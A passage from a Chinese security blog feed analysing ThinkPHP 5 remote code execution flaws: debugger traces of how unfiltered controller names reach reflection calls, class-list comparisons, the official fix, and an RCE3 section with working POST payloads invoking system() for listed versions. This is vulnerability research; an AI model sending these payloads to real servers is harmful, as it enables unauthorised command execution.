alt="image-20200923230344961"></p><p>可以看到系统命令成功执行。</p><p>根据修复的内容：对控制器名的获取，直接在获取控制器的地方下断点，来进行调试。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200924150235.png" alt="image-20200923231658510"></p><p>得出：控制器名是通过<code>$result[1]</code> 来获取的。</p><blockquote><p>而 <strong>$result</strong> 的值来源于兼容模式下的 <strong>pathinfo</strong> ，即 <strong>s</strong> 参数</p></blockquote><p>继续进行单步调试，程序会来到App类下的<code>run</code>方法</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200924150152.png" alt="image-20200924094001917"></p><p>继续调用<code>Dispatch</code>类的<code>run</code>方法，该方法调用了<code>exec</code> 方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $option = <span class="keyword">$this</span>-&gt;rule-&gt;getOption();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检测路由after行为</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($option[<span class="string">&#x27;after&#x27;</span>])) &#123;</span><br><span class="line">        $dispatch = <span class="keyword">$this</span>-&gt;checkAfter($option[<span class="string">&#x27;after&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($dispatch <span class="keyword">instanceof</span> Response) &#123;</span><br><span class="line">            <span class="keyword">return</span> $dispatch;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 数据自动验证</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($option[<span class="string">&#x27;validate&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;autoValidate($option[<span class="string">&#x27;validate&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $data = <span class="keyword">$this</span>-&gt;exec();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;autoResponse($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 监听module_init</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;app[<span class="string">&#x27;hook&#x27;</span>]-&gt;listen(<span class="string">&#x27;module_init&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 实例化控制器</span></span><br><span class="line">        $instance = <span class="keyword">$this</span>-&gt;app-&gt;controller(<span class="keyword">$this</span>-&gt;controller,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;url_controller_layer&#x27;</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;controller_suffix&#x27;</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;empty_controller&#x27;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($instance <span class="keyword">instanceof</span> Controller) &#123;</span><br><span class="line">            $instance-&gt;registerMiddleware();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException $e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">&#x27;controller not exists:&#x27;</span> . $e-&gt;getClass());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;app[<span class="string">&#x27;middleware&#x27;</span>]-&gt;controller(<span class="function"><span class="keyword">function</span> (<span class="params">Request $request, $next</span>) <span class="title">use</span> (<span class="params">$instance</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 获取当前操作名</span></span><br><span class="line">        $action = <span class="keyword">$this</span>-&gt;actionName . <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;action_suffix&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_callable([$instance, $action])) &#123;</span><br><span class="line">            <span class="comment">// 执行操作方法</span></span><br><span class="line">            $call = [$instance, $action];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 严格获取当前操作方法名</span></span><br><span class="line">            $reflect    = <span class="keyword">new</span> ReflectionMethod($instance, $action);</span><br><span class="line">            $methodName = $reflect-&gt;getName();</span><br><span class="line">            $suffix     = <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;action_suffix&#x27;</span>);</span><br><span class="line">            $actionName = $suffix ? substr($methodName, <span class="number">0</span>, -strlen($suffix)) : $methodName;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;request-&gt;setAction($actionName);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 自动获取请求变量</span></span><br><span class="line">            $vars = <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;url_param_type&#x27;</span>)</span><br><span class="line">            ? <span class="keyword">$this</span>-&gt;request-&gt;route()</span><br><span class="line">            : <span class="keyword">$this</span>-&gt;request-&gt;param();</span><br><span class="line">            $vars = array_merge($vars, <span class="keyword">$this</span>-&gt;param);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_callable([$instance, <span class="string">&#x27;_empty&#x27;</span>])) &#123;</span><br><span class="line">            <span class="comment">// 空操作</span></span><br><span class="line">            $call    = [$instance, <span class="string">&#x27;_empty&#x27;</span>];</span><br><span class="line">            $vars    = [<span class="keyword">$this</span>-&gt;actionName];</span><br><span class="line">            $reflect = <span class="keyword">new</span> ReflectionMethod($instance, <span class="string">&#x27;_empty&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 操作不存在</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">&#x27;method not exists:&#x27;</span> . get_class($instance) . <span class="string">&#x27;-&gt;&#x27;</span> . $action . <span class="string">&#x27;()&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;app[<span class="string">&#x27;hook&#x27;</span>]-&gt;listen(<span class="string">&#x27;action_begin&#x27;</span>, $call);</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;autoResponse($data);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;app[<span class="string">&#x27;middleware&#x27;</span>]-&gt;dispatch(<span class="keyword">$this</span>-&gt;request, <span class="string">&#x27;controller&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = <span class="keyword">$this</span>-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars);</span><br></pre></td></tr></table></figure><p>利用了反射机制，调用类的方法，这里类和方法都可控。</p><p>该方法中，<strong>未对实例化控制器和操作名进行任何过滤、合法性检测操作，这就是导致远程代码执行的直接原因。</strong></p><hr><p>如果直接拿该版本的 <strong>payload</strong> 去测试 <strong>ThinkPHP5.0.x</strong> 版本，会发现很多 <strong>payload</strong> 都不能成功。其原因是两个大版本已加载的类不同，导致可利用的类也不尽相同。具体如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line">ThinkPHP 5.1.x                  ThinkPHP 5.0.x</span><br><span class="line">stdClass                        stdClass </span><br><span class="line">Exception                       Exception </span><br><span class="line">ErrorException                  ErrorException </span><br><span class="line">Closure                         Closure </span><br><span class="line">Generator                       Generator </span><br><span class="line">DateTime                        DateTime </span><br><span class="line">DateTimeImmutable               DateTimeImmutable </span><br><span class="line">DateTimeZone                    DateTimeZone </span><br><span class="line">DateInterval                    DateInterval </span><br><span class="line">DatePeriod                      DatePeriod </span><br><span class="line">LibXMLError                     LibXMLError </span><br><span class="line">DOMException                    DOMException </span><br><span class="line">DOMStringList                   DOMStringList </span><br><span class="line">DOMNameList                     DOMNameList </span><br><span class="line">DOMImplementationList           DOMImplementationList </span><br><span class="line">DOMImplementationSource         DOMImplementationSource </span><br><span class="line">DOMImplementation               DOMImplementation </span><br><span class="line">DOMNode                         DOMNode </span><br><span class="line">DOMNameSpaceNode                DOMNameSpaceNode </span><br><span class="line">DOMDocumentFragment             DOMDocumentFragment </span><br><span class="line">DOMDocument                     DOMDocument </span><br><span class="line">DOMNodeList                     DOMNodeList </span><br><span class="line">DOMNamedNodeMap                 DOMNamedNodeMap </span><br><span class="line">DOMCharacterData                DOMCharacterData </span><br><span class="line">DOMAttr                         DOMAttr </span><br><span class="line">DOMElement                      DOMElement </span><br><span class="line">DOMText                         DOMText </span><br><span class="line">DOMComment                      DOMComment </span><br><span class="line">DOMTypeinfo                     DOMTypeinfo </span><br><span class="line">DOMUserDataHandler              DOMUserDataHandler </span><br><span class="line">DOMDomError                     DOMDomError </span><br><span class="line">DOMErrorHandler                 DOMErrorHandler </span><br><span class="line">DOMLocator                      DOMLocator </span><br><span class="line">DOMConfiguration                DOMConfiguration </span><br><span class="line">DOMCdataSection                 DOMCdataSection </span><br><span class="line">DOMDocumentType                 DOMDocumentType </span><br><span class="line">DOMNotation                     DOMNotation </span><br><span class="line">DOMEntity                       DOMEntity </span><br><span class="line">DOMEntityReference              DOMEntityReference </span><br><span class="line">DOMProcessingInstruction        DOMProcessingInstruction </span><br><span class="line">DOMStringExtend                 DOMStringExtend </span><br><span class="line">DOMXPath                        DOMXPath </span><br><span class="line">finfo                           finfo </span><br><span class="line">LogicException                  LogicException </span><br><span class="line">BadFunctionCallException        BadFunctionCallException </span><br><span class="line">BadMethodCallException          BadMethodCallException </span><br><span class="line">DomainException                 DomainException </span><br><span class="line">InvalidArgumentException        InvalidArgumentException </span><br><span class="line">LengthException                 LengthException </span><br><span class="line">OutOfRangeException             OutOfRangeException </span><br><span class="line">RuntimeException                RuntimeException </span><br><span class="line">OutOfBoundsException            OutOfBoundsException </span><br><span class="line">OverflowException               OverflowException </span><br><span class="line">RangeException                  RangeException </span><br><span class="line">UnderflowException              UnderflowException </span><br><span class="line">UnexpectedValueException        UnexpectedValueException </span><br><span class="line">RecursiveIteratorIterator       RecursiveIteratorIterator </span><br><span class="line">IteratorIterator                IteratorIterator </span><br><span class="line">FilterIterator                  FilterIterator </span><br><span class="line">RecursiveFilterIterator         RecursiveFilterIterator </span><br><span class="line">CallbackFilterIterator          CallbackFilterIterator </span><br><span class="line">RecursiveCallbackFilterIterator RecursiveCallbackFilterIterator </span><br><span class="line">ParentIterator                  ParentIterator </span><br><span class="line">LimitIterator                   LimitIterator </span><br><span class="line">CachingIterator                 CachingIterator </span><br><span class="line">RecursiveCachingIterator        RecursiveCachingIterator </span><br><span class="line">NoRewindIterator                NoRewindIterator </span><br><span class="line">AppendIterator                  AppendIterator </span><br><span class="line">InfiniteIterator                InfiniteIterator </span><br><span class="line">RegexIterator                   RegexIterator </span><br><span class="line">RecursiveRegexIterator          RecursiveRegexIterator </span><br><span class="line">EmptyIterator                   EmptyIterator </span><br><span class="line">RecursiveTreeIterator           RecursiveTreeIterator </span><br><span class="line">ArrayObject                     ArrayObject </span><br><span class="line">ArrayIterator                   ArrayIterator </span><br><span class="line">RecursiveArrayIterator          RecursiveArrayIterator </span><br><span class="line">SplFileInfo                     SplFileInfo </span><br><span class="line">DirectoryIterator               DirectoryIterator </span><br><span class="line">FilesystemIterator              FilesystemIterator </span><br><span class="line">RecursiveDirectoryIterator      RecursiveDirectoryIterator </span><br><span class="line">GlobIterator                    GlobIterator </span><br><span class="line">SplFileObject                   SplFileObject </span><br><span class="line">SplTempFileObject               SplTempFileObject </span><br><span class="line">SplDoublyLinkedList             SplDoublyLinkedList </span><br><span class="line">SplQueue                        SplQueue </span><br><span class="line">SplStack                        SplStack </span><br><span class="line">SplHeap                         SplHeap </span><br><span class="line">SplMinHeap                      SplMinHeap </span><br><span class="line">SplMaxHeap                      SplMaxHeap </span><br><span class="line">SplPriorityQueue                SplPriorityQueue </span><br><span class="line">SplFixedArray                   SplFixedArray </span><br><span class="line">SplObjectStorage                SplObjectStorage </span><br><span class="line">MultipleIterator                MultipleIterator </span><br><span class="line">SessionHandler                  SessionHandler </span><br><span class="line">ReflectionException             ReflectionException </span><br><span class="line">Reflection                      Reflection </span><br><span class="line">ReflectionFunctionAbstract      ReflectionFunctionAbstract </span><br><span class="line">ReflectionFunction              ReflectionFunction </span><br><span class="line">ReflectionParameter             ReflectionParameter </span><br><span class="line">ReflectionMethod                ReflectionMethod </span><br><span class="line">ReflectionClass                 ReflectionClass </span><br><span class="line">ReflectionObject                ReflectionObject </span><br><span class="line">ReflectionProperty              ReflectionProperty </span><br><span class="line">ReflectionExtension             ReflectionExtension </span><br><span class="line">ReflectionZendExtension         ReflectionZendExtension </span><br><span class="line">__PHP_Incomplete_Class          __PHP_Incomplete_Class </span><br><span class="line">php_user_filter                 php_user_filter </span><br><span class="line">Directory                       Directory </span><br><span class="line">SimpleXMLElement                SimpleXMLElement </span><br><span class="line">SimpleXMLIterator               SimpleXMLIterator </span><br><span class="line">SoapClient                      SoapClient </span><br><span class="line">SoapVar                         SoapVar </span><br><span class="line">SoapServer                      SoapServer </span><br><span class="line">SoapFault                       SoapFault </span><br><span class="line">SoapParam                       SoapParam </span><br><span class="line">SoapHeader                      SoapHeader </span><br><span class="line">PharException                   PharException </span><br><span class="line">Phar                            Phar </span><br><span class="line">PharData                        PharData </span><br><span class="line">PharFileInfo                    PharFileInfo </span><br><span class="line">XMLReader                       XMLReader </span><br><span class="line">XMLWriter                       XMLWriter </span><br><span class="line">ZipArchive                      ZipArchive </span><br><span class="line">PDOException                    PDOException </span><br><span class="line">PDO                             PDO </span><br><span class="line">PDOStatement                    PDOStatement </span><br><span class="line">PDORow                          PDORow </span><br><span class="line">CURLFile                        CURLFile </span><br><span class="line">Collator                        Collator </span><br><span class="line">NumberFormatter                 NumberFormatter </span><br><span class="line">Normalizer                      Normalizer </span><br><span class="line">Locale                          Locale </span><br><span class="line">MessageFormatter                MessageFormatter </span><br><span class="line">IntlDateFormatter               IntlDateFormatter </span><br><span class="line">ResourceBundle                  ResourceBundle </span><br><span class="line">Transliterator                  Transliterator </span><br><span class="line">IntlTimeZone                    IntlTimeZone </span><br><span class="line">IntlCalendar                    IntlCalendar </span><br><span class="line">IntlGregorianCalendar           IntlGregorianCalendar </span><br><span class="line">Spoofchecker                    Spoofchecker </span><br><span class="line">IntlException                   IntlException </span><br><span class="line">IntlIterator                    IntlIterator </span><br><span class="line">IntlBreakIterator               IntlBreakIterator </span><br><span class="line">IntlRuleBasedBreakIterator      IntlRuleBasedBreakIterator </span><br><span class="line">IntlCodePointBreakIterator      IntlCodePointBreakIterator </span><br><span class="line">IntlPartsIterator               IntlPartsIterator </span><br><span class="line">UConverter                      UConverter </span><br><span class="line">JsonIncrementalParser           JsonIncrementalParser </span><br><span class="line">mysqli_sql_exception            mysqli_sql_exception </span><br><span class="line">mysqli_driver                   mysqli_driver </span><br><span class="line">mysqli                          mysqli </span><br><span class="line">mysqli_warning                  mysqli_warning </span><br><span class="line">mysqli_result                   mysqli_result </span><br><span class="line">mysqli_stmt                     mysqli_stmt </span><br><span class="line">Composer\Autoload\ComposerStaticInit81a0c33d33d83a86fdd976e2aff753d9            Composer\Autoload\ComposerStaticInit8a67cf04fc9c0db5b85a9d897c12a44c </span><br><span class="line">think\Loader                    think\Loader</span><br><span class="line">think\Error                     think\Error </span><br><span class="line">think\Container                 think\Config </span><br><span class="line">think\App                       think\App </span><br><span class="line">think\Env                       think\Request </span><br><span class="line">think\Config                    think\Hook </span><br><span class="line">think\Hook                      think\Env </span><br><span class="line">think\Facade                    think\Lang </span><br><span class="line">think\facade\Env                think\Log </span><br><span class="line">env                             think\Route</span><br><span class="line">think\Db </span><br><span class="line">think\Lang </span><br><span class="line">think\Request </span><br><span class="line">think\facade\Route </span><br><span class="line">route </span><br><span class="line">think\Route </span><br><span class="line">think\route\Rule </span><br><span class="line">think\route\RuleGroup </span><br><span class="line">think\route\Domain </span><br><span class="line">think\route\RuleItem </span><br><span class="line">think\route\RuleName </span><br><span class="line">think\route\Dispatch </span><br><span class="line">think\route\dispatch\Url </span><br><span class="line">think\route\dispatch\Module </span><br><span class="line">think\Middleware </span><br><span class="line">think\Cookie </span><br><span class="line">think\View </span><br><span class="line">think\view\driver\Think </span><br><span class="line">think\Template </span><br><span class="line">think\template\driver\File </span><br><span class="line">think\Log </span><br><span class="line">think\log\driver\File </span><br><span class="line">think\Session </span><br><span class="line">think\Debug </span><br><span class="line">think\Cache </span><br><span class="line">think\cache\Driver </span><br><span class="line">think\cache\driver\File </span><br></pre></td></tr></table></figure><h2 id="利用总结-1"><a href="#利用总结-1" class="headerlink" title="利用总结"></a>利用总结</h2><p>by Mochazz:</p><p><img src="https://github.com/Mochazz/ThinkPHP-Vuln/raw/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C9/8.png" alt="8"></p><h2 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><blockquote><p>代码层面：增加对控制器名的合法性检查。</p><p>应急层面：临时开启强制路由。</p></blockquote><p>官方的修复方法是：增加正则表达式 <code>^[A-Za-z](\w)*$</code> ，对控制器名进行合法性检测。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923224451.png" alt="image-20200923224445456"></p><h1 id="RCE3"><a href="#RCE3" class="headerlink" title="RCE3"></a>RCE3</h1><h2 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># ThinkPHP &lt;&#x3D; 5.0.13</span><br><span class="line">POST &#x2F;?s&#x3D;index&#x2F;index</span><br><span class="line">s&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;&amp;filter[]&#x3D;system</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;&#x3D; 5.0.23、5.1.0 &lt;&#x3D; 5.1.16 需要开启框架app_debug</span><br><span class="line">POST &#x2F;</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;server[REQUEST_METHOD]&#x3D;ls -al</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;&#x3D; 5.0.23 需要存在xxx的method路由，例如captcha</span><br><span class="line">POST &#x2F;?s&#x3D;xxx HTTP&#x2F;1.1</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;ls+-al</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;ls</span><br></pre></td></tr></table></figure><h2 id="漏洞概述-2"><a href="#漏洞概述-2" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>和上一个RCE直接原因一样，都是没有对控制器进行很好的合法性校验。</p><p>漏洞存在于 <strong>ThinkPHP</strong> 底层没有对控制器名进行很好的合法性校验，导致在未开启强制路由的情况下，用户可以调用任意类的任意方法，最终导致 <strong>远程代码执行漏洞</strong> 的产生。</p><h2 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h2><p><strong>5.0.0&lt;=ThinkPHP5&lt;=5.0.23</strong> 、<strong>5.1.0&lt;=ThinkPHP&lt;=5.1.30</strong></p><h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h2 id="利用总结-2"><a href="#利用总结-2" class="headerlink" title="利用总结"></a>利用总结</h2><h2 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;主要参考资料：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/Mochazz/ThinkPHP-Vuln/&quot;&gt;https://github.com/Mochazz/ThinkPHP-Vuln/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;RCE1-利用缓存文件G</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="RCE" scheme="https://hack-for.fun/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>CSS 注入学习笔记</title>
    <link href="https://hack-for.fun/5dcc.html"/>
    <id>https://hack-for.fun/5dcc.html</id>
    <published>2020-09-22T12:30:30.000Z</published>
    <updated>2020-09-23T09:36:31.894Z</updated>
    
    
    
    
    
    <category term="渗透测试" scheme="https://hack-for.fun/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="CTF" scheme="https://hack-for.fun/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>《透视APT》读书笔记</title>
    <link href="https://hack-for.fun/0.html"/>
    <id>https://hack-for.fun/0.html</id>
    <published>2020-09-20T16:00:00.000Z</published>
    <updated>2020-09-22T02:51:54.505Z</updated>
    
